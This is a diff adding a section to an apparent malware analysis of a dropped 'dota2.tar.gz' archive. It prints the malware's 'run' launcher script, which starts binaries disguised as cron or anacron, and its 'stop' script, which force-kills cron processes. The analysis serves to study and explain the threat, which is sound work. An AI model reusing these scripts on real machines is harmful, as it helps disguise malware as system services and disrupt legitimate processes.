@@ -34,3 +34,34 @@ files ```a``` and ```cron```.
 
 
 ### A Look into the files dropped
+
+In Figure 3, we can see that there is a bunch of folders and files inside the .tz. The attackers used
+![Octocat](https://i.imgur.com/jmoC3qM.png=100x20)
+Figure 3: the untar-ed contents of ```dota2.tar.gz```
+
+In Figure 4,  we take a peak inside the file at ```a/run``` we can see that its a bash script that job is to check what arch the host machine is using and then runs the correct file. 
+```ruby
+#!/bin/bash
+./stop
+sleep 10
+pwd > dir.dir
+dir=$(cat dir.dir)
+ARCH=`uname -m`
+	if [ "$ARCH" == "i686" ]; then
+		nohup ./anacron >>/dev/null & 
+	elif [ "$ARCH" == "x86_64" ];   then
+		./cron || ./anacron
+	fi
+echo $! > bash.pid
+```
+Figure 4: the contents of run
+
+In Figure 3, we can see that the ```a/run``` file runs a file called ```./stop```. In Figure 5, we can see that its job is kill any running proccesss called cron. The stop script also removes the file named ```.proc```.
+
+```ruby#!/bin/sh
+pkill -9 cron
+killall -9 cron
+kill -9 `ps x|grep cron|grep -v grep|awk '{print $1}'`>.proc
+rm -rf .proc
+```
+Figure 5: the contents of ```a/stop```.
